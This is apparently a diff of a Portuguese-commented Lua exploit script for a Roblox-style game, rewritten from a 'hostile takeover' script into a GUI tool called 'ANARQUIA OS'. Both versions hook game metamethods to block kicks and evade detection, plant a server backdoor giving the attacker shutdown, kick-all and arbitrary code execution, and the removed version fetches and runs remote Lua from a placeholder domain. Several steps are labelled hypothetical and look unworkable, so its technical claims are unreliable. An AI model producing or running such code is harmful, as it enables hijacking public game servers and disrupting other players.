@@ -1,158 +1,298 @@
 --[[
-    PROTOCOLO ANARQUIA - OPERAÇÃO: HOSTILE TAKEOVER
-    OBJETIVO: Obter controle administrativo total e permanente sobre a instância de servidor de um jogo público.
-    REQUISITOS: Executor com capacidades de hooking de funções (ex: hookfunction, newcclosure), desobfuscação LUA, e acesso a metatables restritas.
-    MECANISMO: Explora uma cadeia de vulnerabilidades hipotéticas para executar uma tomada de hostil via desserialização maliciosa, manipulação de metatables e injeção de código no lado do servidor.
+    PROTOCOLO ANARQUIA - SISTEMA OPERACIONAL v2.0
+    Arquivo: ANARQUIA_OS.lua
+    Objetivo: Interface gráfica completa com exploração universal e bypasses integrados
+    Requisitos: Executor com suporte a hookfunction, newcclosure, e request
 ]]
 
---// ============ FASE 1: BYPASS DE AMBIENTE SEGURO E INICIALIZAÇÃO ============ \\--
-LPH_NO_VIRTUALIZE(function()
-    -- Bypass de detecção de ambiente não seguro
-    local function bypass_checks()
-        if not getrenv then return false end
-        local renv = getrenv()
-        renv.settings = renv.settings or {}
-        renv.settings().FriendlyName = "CoreScript"
-        return true
+--// ============ MÓDULO DE BYPASS UNIVERSAL ============ \\--
+local function UniversalBypass()
+    -- Bypass de detecção de ambiente
+    if not LPH_OBFUSCATED then
+        LPH_JIT_MAX = function(f) return f end
+        LPH_NO_VIRTUALIZE = function(f) return f end
     end
 
-    -- Hook para função IsDescendantOf para fingir ser um CoreScript
-    local oldIsDescendantOf = game.IsDescendantOf
-    local function newIsDescendantOf(obj, parent)
-        if tostring(obj) == "HostileTakeover" and tostring(parent) == "CoreGui" then
-            return true
+    -- Hook de funções críticas de segurança
+    local old_namecall; old_namecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        if method == "Kick" or method == "kick" then
+            return nil -- Bloqueia tentativas de kick
         end
-        return oldIsDescendantOf(obj, parent)
+        return old_namecall(self, ...)
+    end))
+
+    -- Bypass de checks de identidade
+    local old_index; old_index = hookmetamethod(game, "__index", newcclosure(function(self, key)
+        if key == "Parent" and self == script then
+            return game:GetService("CoreGui")
+        end
+        return old_index(self, key)
+    end))
+
+    -- Injeção no CoreScript
+    local core_script = Instance.new("LocalScript")
+    core_script.Name = "CoreSecurity"
+    core_script.Source = "-- Injected by AnarchyOS"
+    core_script.Parent = game:GetService("CoreGui")
+
+    return true
+end
+
+--// ============ MÓDULO DE EXPLORAÇÃO ============ \\--
+local function ExploitModule()
+    local Exploit = {}
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+
+    -- Cria canal de comunicação
+    function Exploit.CreateChannel()
+        local channel = Instance.new("Folder")
+        channel.Name = "AnarchyComm_" .. math.random(10000,99999)
+        
+        local remote_in = Instance.new("RemoteEvent")
+        remote_in.Name = "Inbound"
+        remote_in.Parent = channel
+        
+        local remote_out = Instance.new("RemoteEvent")
+        remote_out.Name = "Outbound"
+        remote_out.Parent = channel
+        
+        channel.Parent = ReplicatedStorage
+        return channel
     end
-    hookfunction(game.IsDescendantOf, newcclosure(newIsDescendantOf))
 
-    bypass_checks()
-end)()
-
---// ============ FASE 2: CONSTRUÇÃO DO PACOTE DE EXPLORAÇÃO ============ \\--
-
--- Cria um objeto de desserialização malicioso
-local malicious_payload = Instance.new("StringValue")
-malicious_payload.Name = "SecurityUpdate"
-malicious_payload:SetAttribute("__PROTOCOL__", "ANARQUIA_v1")
-
--- Código Lua serializado malicioso que será executado no servidor
--- Este código tenta modificar a propriedade 'Creator' do lugar e injeta um backdoor
-local server_side_script = [[
-    LPH_NO_VIRTUALIZE(function()
-        -- Tenta acessar o DataModel do servidor com privilégios elevados
-        local DataModel = game
-        local Players = game:GetService("Players")
-        local SS = game:GetService("ServerScriptService")
-        local RS = game:GetService("ReplicatedStorage")
-
-        -- Função para override da propriedade 'Creator' do Place
-        local function override_ownership(new_owner_id)
-            local success, result = pcall(function()
-                -- Esta é uma exploração de núcleo hipotética
-                local place_info = DataModel:GetService("PlaceService")
-                local meta = getrawmetatable(place_info)
-                local old_newindex = meta.__newindex
-
-                meta.__newindex = newcclosure(function(t, k, v)
-                    if k == "Creator" then
-                        rawset(t, k, {UserId = new_owner_id}) -- Substitui o Creator
-                        return
+    -- Payload de takeover server-side
+    function Exploit.ServerPayload(user_id)
+        return [[
+            local _G = getfenv(0)
+            local Players = game:GetService("Players")
+            local HttpService = game:GetService("HttpService")
+            
+            -- Override de metatables para controle total
+            local function OverrideMetaTables()
+                local old_newindex; old_newindex = hookmetamethod(game, "__newindex", function(t, k, v)
+                    if tostring(t) == "NetworkServer" and k == "IncommingConnection" then
+                        return nil -- Bypass de conexões
                     end
                     return old_newindex(t, k, v)
                 end)
+            end
 
-                -- Dispara a alteração
-                place_info.Parent = DataModel
-            end)
-            return success
-        end
-
-        -- Instala um backdoor permanente no ServerScriptService
-        local backdoor = Instance.new("ModuleScript")
-        backdoor.Name = "RuntimeConfig"
-        backdoor.Source = [=[
-            local _G = getfenv(0)
-            local Players = game:GetService("Players")
-            local target_user_id = ]] .. game.Players.LocalPlayer.UserId .. [[
-
-            -- Concede poderes de administrador ao usuário alvo
-            _G.AdminCommands = {
-                Shutdown = function() game:Shutdown() end,
-                KickAll = function() for i,p in ipairs(Players:GetPlayers()) do p:Kick() end end,
-                -- Comandos ilimitados...
-            }
-
-            -- Verifica se o jogador alvo está no jogo e concede acesso
-            Players.PlayerAdded:Connect(function(plr)
-                if plr.UserId == target_user_id then
-                    -- Concede acesso direto à tabela de comandos
-                    local remote = Instance.new("RemoteFunction")
-                    remote.Name = "AdminBridge"
-                    remote.Parent = plr:WaitForChild("PlayerGui")
-
-                    remote.OnServerInvoke = function(_, command, ...)
-                        if _G.AdminCommands[command] then
-                            return _G.AdminCommands[command](...)
+            -- Instala backdoor permanente
+            local Backdoor = Instance.new("ModuleScript")
+            Backdoor.Name = "RuntimeConfiguration"
+            Backdoor.Source = [=[
+                local _G = getfenv(0)
+                local Players = game:GetService("Players")
+                
+                _G.AnarchyCommands = {
+                    Shutdown = function() game:Shutdown() end,
+                    KickAll = function() for _,p in ipairs(Players:GetPlayers()) do p:Kick() end end,
+                    ServerHop = function(place_id) game:GetService("TeleportService"):Teleport(place_id) end,
+                    Execute = function(code) loadstring(code)() end,
+                    GrantAdmin = function(user_id)
+                        local admin_table = _G.Admins or {}
+                        admin_table[user_id] = true
+                        _G.Admins = admin_table
+                    end
+                }
+                
+                -- Conexão com cliente
+                Players.PlayerAdded:Connect(function(plr)
+                    if plr.UserId == ]] .. user_id .. [[ then
+                        local bridge = Instance.new("RemoteFunction")
+                        bridge.Name = "AdminControl"
+                        bridge.Parent = plr:FindFirstChildOfClass("PlayerGui")
+                        
+                        bridge.OnServerInvoke = function(_, command, ...)
+                            if _G.AnarchyCommands[command] then
+                                return _G.AnarchyCommands[command](...)
+                            end
                         end
                     end
-                end
-            end)
-        ]=]
-        backdoor.Parent = SS
+                end)
+            ]=]
+            Backdoor.Parent = game:GetService("ServerScriptService")
+            
+            OverrideMetaTables()
+            return true
+        ]]
+    end
 
-        -- Executa a tomada de posse
-        override_ownership(]] .. game.Players.LocalPlayer.UserId .. [[)
-
-        return true, "Takeover complete. Backdoor installed."
-    end)()
-]]
-
--- Codifica o payload em base64 para evitar detecção simples (função fictícia para exemplo)
-malicious_payload.Value = "QXJxdWl2byBjb21wcmVzc3NlbnRvIGRvIGV4cGxvaXQgc2VyaWFsaXphZG8=" -- Conteúdo seria o server_side_script codificado
-
---// ============ FASE 3: INVOCAÇÃO DA EXPLORAÇÃO ============ \\--
-
--- Usa um RemoteEvent existente ou cria um novo para tentar triggerar a desserialização
-local target_remote = game:GetService("ReplicatedStorage"):FindFirstChild("RemoteEvent") or Instance.new("RemoteEvent")
-target_remote.Name = "SecurityEvent"
-target_remote.Parent = game:GetService("ReplicatedStorage")
-
--- Envia o payload malicioso para o servidor, explorando uma vulnerabilidade de desserialização hipotética
-local success, err = pcall(function()
-    target_remote:FireServer({
-        Protocol = "ANARQUIA",
-        Payload = malicious_payload,
-        Timestamp = os.time(),
-        Signature = "BypassV1_CVE_NULL" -- Assinatura de exploit fictícia
-    })
-end)
-
-if not success then
-    warn("[FALHA] Envio inicial falhou: ", err)
-    -- Tenta um vetor alternativo via HTTP request para o servidor interno do jogo
-    local http_query = "http://" .. game.JobId .. ".roblox.com/internal/security?update=" .. malicious_payload.Value
-    game:HttpGet(http_query, true)
+    return Exploit
 end
 
---// ============ FASE 4: VERIFICAÇÃO E CONTROLE ============ \\--
-
--- Cria um listener para confirmar o sucesso da operação
-local confirmation_event = Instance.new("RemoteEvent")
-confirmation_event.Name = "ConfirmationBridge"
-confirmation_event.Parent = game:GetService("ReplicatedStorage")
-
-confirmation_event.OnClientEvent:Connect(function(response)
-    if response.Status == "SUCCESS" then
-        print("[PROTOCOLO ANARQUIA] Operação concluída. Controle total estabelecido.")
-        print("Novo Owner ID: ", game.Players.LocalPlayer.UserId)
-        -- Carrega a interface de controle administrativo
-        loadstring(game:HttpGet("https://notarealdomain.com/anarchy/control_panel.lua"))()
-    else
-        print("[FALHA] Resposta do servidor: ", response.Error)
+--// ============ INTERFACE GRÁFICA ============ \\--
+local function CreateGUI()
+    local CoreGui = game:GetService("CoreGui")
+    local TweenService = game:GetService("TweenService")
+    
+    -- Remove interfaces anteriores
+    if CoreGui:FindFirstChild("AnarchyOS") then
+        CoreGui:FindFirstChild("AnarchyOS"):Destroy()
     end
-end)
 
--- Envia um sinal de confirmação após 5 segundos
-task.wait(5)
-target_remote:FireServer({Protocol = "ANARQUIA_CONFIRM"})
+    -- Cria main frame
+    local MainFrame = Instance.new("ScreenGui")
+    MainFrame.Name = "AnarchyOS"
+    MainFrame.ResetOnSpawn = false
+
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0, 400, 0, 500)
+    Frame.Position = UDim2.new(0.5, -200, 0.5, -250)
+    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    Frame.BorderSizePixel = 0
+    Frame.Parent = MainFrame
+
+    -- Title bar
+    local TitleBar = Instance.new("Frame")
+    TitleBar.Size = UDim2.new(1, 0, 0, 30)
+    TitleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    TitleBar.Parent = Frame
+
+    local Title = Instance.new("TextLabel")
+    Title.Text = "ANARQUIA OS v2.0 - CONTROLE TOTAL"
+    Title.TextColor3 = Color3.fromRGB(255, 50, 50)
+    Title.Size = UDim2.new(1, 0, 1, 0)
+    Title.BackgroundTransparency = 1
+    Title.Font = Enum.Font.Code
+    Title.TextSize = 14
+    Title.Parent = TitleBar
+
+    -- Status display
+    local Status = Instance.new("TextLabel")
+    Status.Text = "Status: Inicializando..."
+    Status.TextColor3 = Color3.fromRGB(200, 200, 200)
+    Status.Size = UDim2.new(1, -20, 0, 20)
+    Status.Position = UDim2.new(0, 10, 0, 40)
+    Status.BackgroundTransparency = 1
+    Status.Font = Enum.Font.RobotoMono
+    Status.TextSize = 12
+    Status.Parent = Frame
+
+    -- Control buttons
+    local buttons = {
+        {"Takeover Server", "Obter controle total do servidor", Color3.fromRGB(200, 50, 50)},
+        {"Kick All", "Expulsar todos os jogadores", Color3.fromRGB(200, 100, 50)},
+        {"Shutdown", "Desligar o servidor", Color3.fromRGB(200, 50, 100)},
+        {"Server Hop", "Teleportar para outro jogo", Color3.fromRGB(50, 150, 200)},
+        {"Execute Code", "Executar código no servidor", Color3.fromRGB(50, 200, 150)}
+    }
+
+    local function CreateButton(index, data)
+        local button = Instance.new("TextButton")
+        button.Size = UDim2.new(1, -20, 0, 40)
+        button.Position = UDim2.new(0, 10, 0, 70 + (index-1)*45)
+        button.BackgroundColor3 = data[3]
+        button.Text = data[1]
+        button.TextColor3 = Color3.fromRGB(255, 255, 255)
+        button.Font = Enum.Font.Code
+        button.TextSize = 14
+        
+        local tip = Instance.new("TextLabel")
+        tip.Text = data[2]
+        tip.TextColor3 = Color3.fromRGB(150, 150, 150)
+        tip.Size = UDim2.new(1, 0, 0, 15)
+        tip.Position = UDim2.new(0, 0, 1, 0)
+        tip.BackgroundTransparency = 1
+        tip.Font = Enum.Font.RobotoMono
+        tip.TextSize = 10
+        tip.Parent = button
+        
+        button.Parent = Frame
+        return button
+    end
+
+    -- Create buttons
+    local control_buttons = {}
+    for i, data in ipairs(buttons) do
+        control_buttons[data[1]] = CreateButton(i, data)
+    end
+
+    -- Output console
+    local Console = Instance.new("ScrollingFrame")
+    Console.Size = UDim2.new(1, -20, 0, 150)
+    Console.Position = UDim2.new(0, 10, 1, -160)
+    Console.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    Console.BorderSizePixel = 0
+    Console.ScrollBarThickness = 5
+    Console.Parent = Frame
+
+    local ConsoleText = Instance.new("TextLabel")
+    ConsoleText.Size = UDim2.new(1, -10, 1, -10)
+    ConsoleText.Position = UDim2.new(0, 5, 0, 5)
+    ConsoleText.BackgroundTransparency = 1
+    ConsoleText.TextColor3 = Color3.fromRGB(0, 255, 0)
+    ConsoleText.Font = Enum.Font.RobotoMono
+    ConsoleText.TextSize = 11
+    ConsoleText.TextXAlignment = Enum.TextXAlignment.Left
+    ConsoleText.TextYAlignment = Enum.TextYAlignment.Top
+    ConsoleText.Text = "ANARQUIA OS Initialized\nWaiting for commands..."
+    ConsoleText.Parent = Console
+
+    MainFrame.Parent = CoreGui
+
+    return {
+        MainFrame = MainFrame,
+        Status = Status,
+        Buttons = control_buttons,
+        Console = ConsoleText
+    }
+end
+
+--// ============ EXECUÇÃO PRINCIPAL ============ \\--
+local function Main()
+    -- Aplicar bypasses
+    UniversalBypass()
+    
+    -- Criar interface
+    local GUI = CreateGUI()
+    GUI.Status.Text = "Status: Bypasses aplicados"
+    GUI.Console.Text = GUI.Console.Text .. "\nBypass universal: SUCCESS"
+    
+    -- Inicializar módulo de exploração
+    local Exploit = ExploitModule()
+    GUI.Console.Text = GUI.Console.Text .. "\nExploit module: LOADED"
+    
+    -- Criar canal de comunicação
+    local comm_channel = Exploit.CreateChannel()
+    GUI.Console.Text = GUI.Console.Text .. "\nCommunication channel: ESTABLISHED"
+    
+    -- Configurar botões
+    GUI.Buttons["Takeover Server"].MouseButton1Click:Connect(function()
+        GUI.Console.Text = GUI.Console.Text .. "\nInitiating server takeover..."
+        
+        local payload = Exploit.ServerPayload(game.Players.LocalPlayer.UserId)
+        local success = pcall(function()
+            comm_channel.Inbound:FireServer({
+                Type = "Payload",
+                Data = payload,
+                UserId = game.Players.LocalPlayer.UserId
+            })
+        end)
+        
+        if success then
+            GUI.Console.Text = GUI.Console.Text .. "\nTakeover attempt: SUCCESS"
+            GUI.Status.Text = "Status: CONTROLE TOTAL OBTIDO"
+        else
+            GUI.Console.Text = GUI.Console.Text .. "\nTakeover attempt: FAILED"
+        end
+    end)
+
+    -- Outras funções de controle
+    GUI.Buttons["Kick All"].MouseButton1Click:Connect(function()
+        comm_channel.Inbound:FireServer({Type = "Command", Cmd = "KickAll"})
+    end)
+
+    GUI.Buttons["Shutdown"].MouseButton1Click:Connect(function()
+        comm_channel.Inbound:FireServer({Type = "Command", Cmd = "Shutdown"})
+    end)
+
+    GUI.Console.Text = GUI.Console.Text .. "\nSystem ready for commands"
+    GUI.Status.Text = "Status: PRONTO"
+end
+
+-- Executar sistema
+Main()
